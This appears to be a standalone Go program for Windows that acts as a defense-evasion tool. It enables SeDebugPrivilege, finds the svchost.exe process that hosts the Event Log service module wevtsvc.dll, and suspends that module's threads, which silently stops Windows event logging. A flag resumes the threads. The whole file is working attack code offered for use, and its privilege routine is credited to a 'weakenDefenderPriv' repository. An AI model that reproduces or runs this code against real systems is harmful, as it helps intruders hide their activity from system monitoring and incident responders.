package main

import (
	"flag"
	"fmt"
	"os"
	"syscall"
	"unsafe"

	"golang.org/x/sys/windows"
)

var (
	modKernel32                  = syscall.NewLazyDLL("kernel32.dll")
	procCloseHandle              = modKernel32.NewProc("CloseHandle")
	procCreateToolhelp32Snapshot = modKernel32.NewProc("CreateToolhelp32Snapshot")
	procProcess32First           = modKernel32.NewProc("Process32FirstW")
	procProcess32Next            = modKernel32.NewProc("Process32NextW")
	procOpenThread               = modKernel32.NewProc("OpenThread")
	procOpenProcess              = modKernel32.NewProc("OpenProcess")
	procReadProcessMemory        = modKernel32.NewProc("ReadProcessMemory")
	procSuspendThread            = modKernel32.NewProc("SuspendThread")
	procResumeThread             = modKernel32.NewProc("ResumeThread")

	hNTDLL                       = syscall.NewLazyDLL("ntdll.dll")
	procNtQueryInformationThread = hNTDLL.NewProc("NtQueryInformationThread")

	advapi32                = syscall.NewLazyDLL("advapi32.dll")
	procQueryTagInformation = advapi32.NewProc("I_QueryTagInformation")

	psapi                   = syscall.NewLazyDLL("Psapi.dll")
	procEnumProcessModules  = psapi.NewProc("EnumProcessModules")
	procGetModuleFileNameEx = psapi.NewProc("GetModuleFileNameExA")
	procGetModuleBaseNameW  = psapi.NewProc("GetModuleBaseNameW")

	threadProcess32First = modKernel32.NewProc("Thread32First")
	threadProcess32Next  = modKernel32.NewProc("Thread32Next")
)

const (
	MAX_PATH = 260
)

type DWORD uint32
type LONG uint32
type ULONG uint32
type BYTE byte
type PBYTE *BYTE
type HANDLE PVOID
type PVOID unsafe.Pointer
type DWORD64 uint64

type PROCESSENTRY32 struct {
	Size              uint32
	CntUsage          uint32
	ProcessID         uint32
	DefaultHeapID     uintptr
	ModuleID          uint32
	CntThreads        uint32
	ParentProcessID   uint32
	PriorityClassBase int32
	Flags             uint32
	ExeFile           [MAX_PATH]uint16
}

type tagTHREADENTRY32 struct {
	DwSize             DWORD
	CntUsage           DWORD
	Th32ThreadID       DWORD
	Th32OwnerProcessID DWORD
	TpBasePri          LONG
	TpDeltaPri         LONG
	DwFlags            DWORD
}

type THREAD_BASIC_INFORMATION struct {
	ExitStatus      uint64
	TebBaseAddress  uint64
	UniqueProcessId uint64
	UniqueThreadId  uint64
	AffinityMask    uint64
	Priority        uint32
	BasePriority    uint32
}

var mmm = flag.Bool("m", false, "")

func EnumProcessModules(hProcess windows.Handle, nSize uintptr) (modules []syscall.Handle, err error) {
	modules = make([]syscall.Handle, nSize)
	var sizeNeeded uint32 = 0
	ret, _, _ := syscall.Syscall6(procEnumProcessModules.Addr(), 4, uintptr(hProcess), uintptr(unsafe.Pointer(&modules[0])), uintptr(nSize), uintptr(unsafe.Pointer(&sizeNeeded)), 0, 0)
	if ret == 0 {
		return nil, err
	}

	return modules, nil
}

func GetModuleFileNameEx(hProcess windows.Handle, hModule syscall.Handle, nSize uintptr) (data []byte, err error) {
	data = make([]byte, nSize)
	ret, _, _ := syscall.Syscall6(procGetModuleFileNameEx.Addr(), 4, uintptr(hProcess), uintptr(hModule), uintptr(unsafe.Pointer(&data[0])), uintptr(nSize), 0, 0)
	if ret == 0 {
		return nil, err
	}

	return data, nil
}

func findWevtsvcDLL(processId uintptr) (windows.ModuleInfo, error) {
	var moduleInfo windows.ModuleInfo
	p, err := windows.OpenProcess(windows.PROCESS_QUERY_INFORMATION|windows.PROCESS_VM_READ, false, uint32(processId))
	if err != nil {
		return moduleInfo, fmt.Errorf("OpenProcess %v error: %v", processId, err)
	}
	defer syscall.CloseHandle(syscall.Handle(p))

	modules, err := EnumProcessModules(windows.Handle(p), 256)
	if err != nil {
		return moduleInfo, fmt.Errorf("EnumProcessModules %v error: %v", processId, err)
	}

	for _, moduleHandle := range modules {
		if moduleHandle != 0 {
			modulePathUTF16 := make([]uint16, 128)
			err = GetModuleBaseName(p, windows.Handle(moduleHandle), &modulePathUTF16[0], uint32(len(modulePathUTF16)))
			if err != nil {
				return moduleInfo, fmt.Errorf("GetModuleBaseName %v error: %v", processId, err)
			}

			modulePath := windows.UTF16ToString(modulePathUTF16)
			if "wevtsvc.dll" == modulePath {
				err = windows.GetModuleInformation(p, windows.Handle(moduleHandle), &moduleInfo, uint32(unsafe.Sizeof(moduleInfo)))
				if err != nil {
					return moduleInfo, fmt.Errorf("GetModuleInformation %v error: %v", processId, err)
				}
				return moduleInfo, nil
			}

		}
	}
	return moduleInfo, nil
}

func GetModuleBaseName(process windows.Handle, module windows.Handle, baseName *uint16, size uint32) (err error) {
	r1, _, e1 := syscall.Syscall6(procGetModuleBaseNameW.Addr(), 4, uintptr(process), uintptr(module), uintptr(unsafe.Pointer(baseName)), uintptr(size), 0, 0)
	if r1 == 0 {
		err = e1
	}
	return
}

func findStartAddressAndHook(processID DWORD, threadId uintptr, wevtsvcDLL windows.ModuleInfo) {
	startAddr := DWORD64(0)
	hThread, _, _ := procOpenThread.Call(windows.THREAD_QUERY_INFORMATION|windows.THREAD_SUSPEND_RESUME|windows.THREAD_TERMINATE, uintptr(0x0), threadId)
	defer syscall.CloseHandle(syscall.Handle(hThread))

	_, _, _ = procNtQueryInformationThread.Call(uintptr(hThread), uintptr(9), uintptr(unsafe.Pointer(&startAddr)), uintptr(unsafe.Sizeof(startAddr)), 0)
	if uintptr(startAddr) > wevtsvcDLL.BaseOfDll && uintptr(startAddr) < wevtsvcDLL.BaseOfDll+uintptr(wevtsvcDLL.SizeOfImage) {
		var err error
		if *mmm {
			_, _, err = procResumeThread.Call(hThread)
		} else {
			_, _, err = procSuspendThread.Call(hThread)
		}
		fmt.Printf("[%v]-[%v] %v %v\n", processID, threadId, err, *mmm)
	}

}

func breakEventLogProcess() error {
	snapshot, err := syscall.CreateToolhelp32Snapshot(syscall.TH32CS_SNAPPROCESS, 0)
	if err != nil {
		return fmt.Errorf("CreateToolhelp32Snapshot error: %v", err)
	}
	defer syscall.CloseHandle(syscall.Handle(snapshot))

	var processEntry syscall.ProcessEntry32
	processEntry.Size = uint32(unsafe.Sizeof(processEntry))
	var wevtsvcDLL windows.ModuleInfo
	var listSVChost = make(map[uint32]bool, 0)

	err = syscall.Process32First(snapshot, &processEntry)
	if err != nil {
		return fmt.Errorf("Process32First error: %v", err)
	}

	for {
		err = syscall.Process32Next(snapshot, &processEntry)
		if err != nil {
			break
		}

		if syscall.UTF16ToString(processEntry.ExeFile[:]) == "svchost.exe" {
			listSVChost[processEntry.ProcessID] = true
			if wevtsvcDLL.BaseOfDll == uintptr(0) {
				wevtsvcDLL, err = findWevtsvcDLL(uintptr(processEntry.ProcessID))
				if err != nil {
					return fmt.Errorf("findWevtsvcDLL error: %v", err)
				}
			}
		}
	}

	handle, _, _ := procCreateToolhelp32Snapshot.Call(syscall.TH32CS_SNAPTHREAD, 0)
	if handle < 0 {
		return syscall.GetLastError()
	}
	defer procCloseHandle.Call(handle)

	var entry tagTHREADENTRY32
	entry.DwSize = DWORD(unsafe.Sizeof(entry))
	ret, _, err := threadProcess32First.Call(handle, uintptr(unsafe.Pointer(&entry)))
	if ret == 0 {
		return fmt.Errorf("Error retrieving process info: %v", err)
	}

	for {
		_, ok := listSVChost[uint32(entry.Th32OwnerProcessID)]
		if ok {
			findStartAddressAndHook(entry.Th32OwnerProcessID, uintptr(entry.Th32ThreadID), wevtsvcDLL)
		}

		ret, _, _ := threadProcess32Next.Call(handle, uintptr(unsafe.Pointer(&entry)))
		if ret == 0 {
			break
		}
	}

	return nil
}

// https://github.com/zha0gongz1/weakenDefenderPriv/blob/main/main.go#L102
func enableDebugPrivilege() error {
	var hToken windows.Token
	handle := windows.CurrentProcess()
	defer windows.CloseHandle(handle)
	err := windows.OpenProcessToken(handle, windows.TOKEN_ADJUST_PRIVILEGES, &hToken)
	if err != nil {
		return err
	}
	defer hToken.Close()

	var sedebugnameValue windows.LUID
	seDebugName, _ := windows.UTF16FromString("SeDebugPrivilege")
	err = windows.LookupPrivilegeValue(nil, &seDebugName[0], &sedebugnameValue)
	if err != nil {
		return err
	}

	var tkp windows.Tokenprivileges
	tkp.PrivilegeCount = 1
	tkp.Privileges[0].Luid = sedebugnameValue
	tkp.Privileges[0].Attributes = windows.SE_PRIVILEGE_ENABLED

	return windows.AdjustTokenPrivileges(hToken, false, &tkp, uint32(unsafe.Sizeof(tkp)), nil, nil)
}

func main() {
	flag.Parse()
	err := enableDebugPrivilege()
	if err != nil {
		fmt.Println(err)
		os.Exit(1)
	}

	err = breakEventLogProcess()
	if err != nil {
		fmt.Println(err)
	}
}
